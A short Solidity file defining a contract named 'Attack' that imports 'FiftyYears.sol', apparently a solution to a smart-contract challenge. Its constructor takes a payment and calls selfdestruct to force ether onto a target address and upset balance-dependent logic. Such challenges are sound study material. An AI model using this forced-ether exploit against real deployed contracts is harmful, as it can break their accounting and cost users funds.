pragma solidity ^0.4.21;

import "./FiftyYears.sol";

contract Attack {
    constructor(address _address) public payable {
        require(msg.value > 0);
        selfdestruct(_address);
    }
}